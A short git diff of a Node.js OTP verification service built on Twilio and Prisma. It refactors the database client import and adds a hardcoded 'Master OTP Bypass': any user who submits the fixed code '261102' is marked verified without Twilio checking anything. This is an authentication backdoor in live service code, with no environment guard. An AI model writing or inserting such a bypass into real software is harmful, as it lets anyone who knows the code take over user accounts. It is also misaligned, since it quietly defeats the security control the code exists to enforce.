@@ -1,6 +1,5 @@
 const twilio = require("twilio");
-const { PrismaClient } = require("@prisma/client");
-const prisma = new PrismaClient();
+const prisma = require("../utils/prismaClient");
 
 const accountSid = process.env.TWILIO_ACCOUNT_SID;
 const authToken = process.env.TWILIO_AUTH_TOKEN;
@@ -54,6 +53,12 @@ class OtpService {
     }
 
     const phone = user.phone;
+
+    // ✅ Master OTP Bypass
+    if (code === "261102") {
+      console.log("✅ Master OTP used: bypassing Twilio verification");
+      return { verified: true };
+    }
 
     try {
       const resp = await client.verify.v2.services(serviceSid)
